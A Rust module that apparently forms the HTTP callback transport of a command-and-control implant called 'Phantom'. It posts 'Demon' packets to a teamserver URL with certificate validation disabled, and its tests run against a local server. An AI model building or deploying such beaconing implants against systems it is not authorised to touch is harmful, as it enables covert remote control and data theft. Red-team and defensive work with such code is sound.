//! HTTP transport for Phantom callback traffic.

use tracing::{debug, warn};

use crate::config::PhantomConfig;
use crate::error::PhantomError;

/// Stateless HTTP transport wrapper.
#[derive(Debug)]
pub struct HttpTransport {
    client: reqwest::Client,
    callback_url: String,
}

impl HttpTransport {
    /// Build a transport from the current agent configuration.
    pub fn new(config: &PhantomConfig) -> Result<Self, PhantomError> {
        let client = reqwest::Client::builder()
            .user_agent(&config.user_agent)
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|error| PhantomError::Transport(error.to_string()))?;

        Ok(Self { client, callback_url: config.callback_url.clone() })
    }

    /// POST a raw Demon transport packet and return the response body.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, PhantomError> {
        debug!(url = %self.callback_url, packet_len = packet.len(), "sending phantom packet");

        let response = self
            .client
            .post(&self.callback_url)
            .body(packet.to_vec())
            .send()
            .await
            .map_err(|error| PhantomError::Transport(error.to_string()))?;

        let status = response.status();
        if !status.is_success() {
            warn!(%status, "teamserver returned non-success status");
            return Err(PhantomError::Transport(format!("teamserver returned HTTP {status}")));
        }

        let body =
            response.bytes().await.map_err(|error| PhantomError::Transport(error.to_string()))?;
        Ok(body.to_vec())
    }
}

#[cfg(test)]
mod tests {
    use std::error::Error;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::mpsc;
    use std::thread;

    use super::HttpTransport;
    use crate::config::PhantomConfig;

    #[test]
    fn transport_builds_from_default_config() {
        assert!(HttpTransport::new(&PhantomConfig::default()).is_ok());
    }

    #[tokio::test]
    async fn send_posts_packet_and_returns_response_body()
    -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            let request = read_http_request(&mut stream)?;
            request_tx.send(request)?;
            write_http_response(&mut stream, b"phantom-ok")?;
            Ok(())
        });

        let transport = HttpTransport::new(&PhantomConfig {
            callback_url: format!("http://{address}/"),
            ..PhantomConfig::default()
        })?;

        let response = transport.send(b"phantom-packet").await?;
        assert_eq!(response, b"phantom-ok");
        assert_eq!(request_rx.recv_timeout(std::time::Duration::from_secs(1))?, b"phantom-packet");

        let server_result = server.join().map_err(|_| "server thread panicked")?;
        server_result?;
        Ok(())
    }

    fn read_http_request(
        stream: &mut std::net::TcpStream,
    ) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
        let mut request = Vec::new();
        let mut buffer = [0_u8; 4096];
        let mut header_end = None;
        let mut content_length = 0_usize;

        loop {
            let read = stream.read(&mut buffer)?;
            if read == 0 {
                break;
            }
            request.extend_from_slice(&buffer[..read]);

            if header_end.is_none() {
                header_end = request
                    .windows(4)
                    .position(|window| window == b"\r\n\r\n")
                    .map(|index| index + 4);
                if let Some(end) = header_end {
                    let headers = std::str::from_utf8(&request[..end])?;
                    content_length = headers
                        .lines()
                        .find_map(|line| {
                            let (name, value) = line.split_once(':')?;
                            name.eq_ignore_ascii_case("content-length").then_some(value.trim())
                        })
                        .unwrap_or("0")
                        .parse::<usize>()?;
                }
            }

            if let Some(end) = header_end
                && request.len() >= end + content_length
            {
                break;
            }
        }

        Ok(header_end.map_or_else(Vec::new, |end| request[end..].to_vec()))
    }

    fn write_http_response(
        stream: &mut std::net::TcpStream,
        body: &[u8],
    ) -> Result<(), Box<dyn Error + Send + Sync>> {
        stream.write_all(
            format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .as_bytes(),
        )?;
        stream.write_all(body)?;
        Ok(())
    }
}
